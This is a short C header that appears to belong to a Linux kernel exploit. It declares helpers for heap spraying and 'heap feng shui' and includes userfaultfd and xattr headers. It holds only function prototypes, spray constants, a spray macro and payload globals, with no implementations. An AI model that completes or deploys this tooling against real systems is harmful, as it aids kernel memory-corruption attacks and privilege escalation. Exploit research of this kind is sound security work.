#pragma once
#include <sys/types.h>
#include <stdio.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/xattr.h>
#include <poll.h>

void fork_and_spray(int round, int objs_each_round, int shade, int new_page);
void init_heap_spray(int _objectSize, char* _payload, int _payloadSize);
void do_heap_fengshui(int loop);
void do_free(u_int64_t VAL);
void change_payload(char* payload, int size);

#define MAX_ROUND 512
#define OBJS_EACH_ROUND 64
#define MIN(X, Y) ((X) >= (Y) ? (Y) : (X))
#define MAX(X, Y) ((X) >= (Y) ? (X) : (Y))
#define do_spray(round, shade) \
    fork_and_spray(round, 1, shade, 1); \
    sleep(1);

static size_t objectSize = 0;
static size_t payloadSize = 0;
static char *fengshuiPayload = NULL;
int default_round;
pthread_mutex_t *lock[MAX_ROUND];